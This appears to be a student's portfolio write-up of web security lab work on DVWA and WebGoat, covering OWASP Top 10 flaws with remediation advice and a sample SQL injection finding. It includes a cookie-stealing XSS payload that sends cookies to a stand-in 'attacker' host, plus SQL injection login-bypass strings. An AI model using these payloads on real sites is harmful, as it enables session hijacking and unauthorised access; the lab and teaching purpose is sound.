# Web Application Security Testing

> Manual and automated security testing of web applications, identifying OWASP Top 10 vulnerabilities and producing structured findings reports with proof-of-concept and remediation guidance.

---

## Overview

| Item | Detail |
|---|---|
| **Primary Tool** | Burp Suite Community Edition |
| **Target Environments** | DVWA (Damn Vulnerable Web App), WebGoat, custom targets |
| **Framework** | OWASP Top 10 (2021) |
| **Semester** | Semester 2 — May 2025 to August 2025 |

---

## Vulnerabilities Tested

### A03 — SQL Injection
**What I did:**
- Identified injectable parameters using manual input testing and Burp Suite's scanner
- Extracted database schema, table names, and credential hashes using UNION-based injection
- Tested blind SQLi using boolean-based and time-based techniques
- Demonstrated authentication bypass via `' OR '1'='1` and variations

**Impact:** Full database read access, authentication bypass, potential data exfiltration

**Remediation:** Parameterised queries / prepared statements; input validation; least-privilege DB accounts

---

### A07 — Cross-Site Scripting (XSS)
**What I did:**
- Identified reflected, stored, and DOM-based XSS injection points
- Crafted payloads to demonstrate session cookie theft: `<script>document.location='http://attacker/steal?c='+document.cookie</script>`
- Tested filter bypass techniques including encoding variations and tag substitution
- Documented context-specific injection (HTML body, attribute, JavaScript context)

**Impact:** Session hijacking, credential theft, defacement, malicious redirect

**Remediation:** Context-aware output encoding; Content Security Policy (CSP); HttpOnly and Secure cookie flags

---

### A01 — Broken Access Control / CSRF
**What I did:**
- Identified missing CSRF token validation on state-changing requests
- Crafted malicious HTML pages that trigger authenticated actions when visited by a logged-in victim
- Demonstrated account modification and fund transfer scenarios
- Tested IDOR (Insecure Direct Object Reference) by manipulating object IDs in requests

**Impact:** Unauthorised actions performed on behalf of authenticated users

**Remediation:** Anti-CSRF tokens; SameSite cookie attribute; re-authentication for sensitive actions

---

### A02 — Authentication Bypass
**What I did:**
- Tested for default and weak credentials using targeted wordlists
- Identified missing account lockout mechanisms enabling brute force
- Exploited insecure password reset flows (predictable tokens, no expiry)
- Bypassed login forms using SQL injection and response manipulation

---

### A05 — Security Misconfiguration
**What I did:**
- Identified directory listing enabled on web servers
- Discovered exposed admin interfaces with default credentials
- Mapped verbose error messages leaking stack traces and technology details
- Located backup files and source code exposed in web root

---

## Sample Vulnerability Report Entry

```
Vulnerability:  SQL Injection — Authentication Bypass
Severity:       Critical (CVSS 9.8)
OWASP:          A03:2021 — Injection
Location:       POST /login — username parameter

Description:
  The login form at /login does not properly sanitise user input before
  incorporating it into SQL queries. An attacker can bypass authentication
  entirely by supplying a crafted username.

Proof of Concept:
  Username: admin'--
  Password: (any value)
  Result:   Logged in as admin without valid credentials

Evidence:
  Request:  POST /login HTTP/1.1
            username=admin'--&password=test

  Response: HTTP/1.1 302 Found
            Location: /admin/dashboard

Remediation:
  Replace dynamic query construction with parameterised queries:
    Before: "SELECT * FROM users WHERE username='" + user + "'"
    After:  cursor.execute("SELECT * FROM users WHERE username=?", (user,))

References:
  CWE-89, OWASP Testing Guide v4.2 section 4.7.5
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite | HTTP proxy, scanner, repeater, intruder |
| OWASP ZAP | Automated vulnerability scanning (supplementary) |
| SQLmap | Automated SQL injection testing and exploitation |
| Firefox DevTools | Client-side analysis, cookie inspection |
| DVWA | Primary target environment |
| WebGoat | OWASP-maintained vulnerable application |

---

## Key Takeaways

- Manual testing catches what automated scanners miss — context matters
- Every vulnerability needs a proof-of-concept to be credible in a findings report
- Remediation guidance must be specific and implementable, not generic
- Attack surface mapping before testing saves significant time during assessment
